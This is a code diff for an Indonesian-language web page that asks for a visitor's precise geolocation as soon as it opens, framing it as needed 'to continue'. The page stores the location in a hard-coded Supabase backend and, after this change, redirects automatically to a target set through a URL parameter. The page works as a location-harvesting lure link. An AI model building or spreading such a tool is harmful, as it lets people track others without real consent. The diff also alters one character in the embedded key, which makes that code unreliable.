@@ -26,7 +26,7 @@
     button{
       padding:10px 12px; border-radius:12px;
       border:1px solid rgba(99, 102, 241, 0.35);
-      background: rgba(99, 102, 241, 0.28);
+      background: rgba(99, 102, 241, 0.18);
       color:#e5e7eb; font-weight:800; font-size:.9rem;
       cursor:pointer;
     }
@@ -45,11 +45,11 @@
 <body>
   <div class="card">
     <h1>Izinkan lokasi untuk melanjutkan</h1>
-    <p>Browser akan meminta izin lokasi. Jika disetujui, kamu bisa lanjut ke tujuan.</p>
+    <p>Browser akan meminta izin lokasi. Jika disetujui, lokasi disimpan lalu kamu akan dialihkan otomatis.</p>
     <p id="dest"></p>
 
     <div class="row">
-      <button id="go" disabled>Lanjut</button>
+      <button id="cancel" disabled>Batalkan</button>
     </div>
 
     <div id="status" class="status">Memulai…</div>
@@ -59,18 +59,21 @@
   <script>
     const statusEl = document.getElementById("status");
     const destEl = document.getElementById("dest");
-    const goBtn = document.getElementById("go");
+    const cancelBtn = document.getElementById("cancel");
 
     function log(msg){
-      statusEl.textContent += "\\n" + msg;
+      statusEl.textContent += "\n" + msg;
       statusEl.scrollTop = statusEl.scrollHeight;
     }
 
     // ====== PAKAI PUNYAMU ======
     const SUPABASE_URL = "https://yfwnfaocsswqerhgxkto.supabase.co";
-    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd25mYW9jc3N3cWVyaGd4a3RvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNjE3MTksImV4cCI6MjA4MDgzNzcxOX0.8ADF4wgcEv_lI2qOPcDt1OujckrIBoDYE52wIE8YZEM";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYm9zZSIsInJlZiI6Inlmd25mYW9jc3N3cWVyaGd4a3RvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNjE3MTksImV4cCI6MjA4MDgzNzcxOX0.8ADF4wgcEv_lI2qOPcDt1OujckrIBoDYE52wIE8YZEM";
     // ===========================
     const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // ubah ini kalau mau lebih cepat/lama
+    const REDIRECT_IN_SECONDS = 1;
 
     function getRedirectUrl(){
       const u = new URL(location.href);
@@ -88,7 +91,31 @@
       ? `Tujuan: <code>${REDIRECT_URL}</code>`
       : `Tujuan belum diset (pakai parameter <code>?to=</code> atau set default di landing).`;
 
-    let canRedirect = false;
+    let redirectTimer = null;
+    let countdownTimer = null;
+
+    function scheduleRedirect(url, seconds){
+      cancelBtn.disabled = false;
+
+      let s = Math.max(0, seconds);
+      log(`Redirect dalam ${s} detik... (klik "Batalkan" untuk berhenti)`);
+
+      countdownTimer = setInterval(() => {
+        s -= 1;
+        if (s > 0) log(`Redirect dalam ${s} detik...`);
+      }, 1000);
+
+      redirectTimer = setTimeout(() => {
+        window.location.href = url;
+      }, seconds * 1000);
+
+      cancelBtn.onclick = () => {
+        clearTimeout(redirectTimer);
+        clearInterval(countdownTimer);
+        log("Redirect dibatalkan.");
+        cancelBtn.disabled = true;
+      };
+    }
 
     async function requestLocation(){
       if (!REDIRECT_URL){
@@ -119,20 +146,15 @@
             return;
           }
 
-          log("Berhasil simpan. Klik 'Lanjut' untuk menuju tujuan.");
-          canRedirect = true;
-          goBtn.disabled = false;
+          log("Berhasil simpan.");
+          scheduleRedirect(REDIRECT_URL, REDIRECT_IN_SECONDS);
         },
         (err) => log("Gagal ambil lokasi: " + err.message),
         { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
       );
     }
 
-    goBtn.addEventListener("click", () => {
-      if (canRedirect && REDIRECT_URL) window.location.href = REDIRECT_URL;
-    });
-
-    // otomatis minta izin saat halaman dibuka (tanpa tombol “Mulai”)
+    // otomatis minta izin saat halaman dibuka
     window.addEventListener("DOMContentLoaded", () => {
       statusEl.textContent = "Inisialisasi…";
       requestLocation();
